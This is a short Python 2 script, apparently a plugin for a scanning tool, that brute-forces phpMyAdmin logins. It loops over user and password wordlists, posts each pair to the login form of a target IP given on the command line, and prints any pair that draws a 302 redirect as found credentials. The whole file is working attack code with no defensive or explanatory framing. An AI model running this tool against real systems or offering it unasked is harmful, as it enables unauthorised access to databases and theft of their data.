'''
plugin PhpMyAdmin
triggers=phpmyadmin
ports=80
'''

import os
import sys
import httplib, urllib

def tryingCreds(ip_addr,port):
	
	
	print "[*] Trying default phpmyadmin creds on "+ ip_addr

	f_users = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/users", 'r')
	f_passwds = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/pass", 'r')

	users = f_users.read()
	passwds = f_passwds.read()

	for user in (users).split('\n'):
		#user = user[:-1]
		for pwd in (passwds).split('\n'):
			#pwd =pwd[:-1]


			params = urllib.urlencode({'pma_username' :user, 'pma_password' : pwd, 'server' :1})
			headers = {"Content-Type": "application/x-www-form-urlencoded"}
			conn = httplib.HTTPConnection(ip_addr, port, timeout=10)

			conn.request("POST","/", params, headers)
			res = conn.getresponse()
			
			print res.status
			if res.status == 302:
				print "[+] Creds found ! "+user+":"+pwd


	print "[*] Trying done."
	

def main(ip_addr, port):
	try:
		tryingCreds(ip_addr,port)
	except Exception as e:
		print e

if __name__ == '__main__':
	main(sys.argv[1], sys.argv[2])
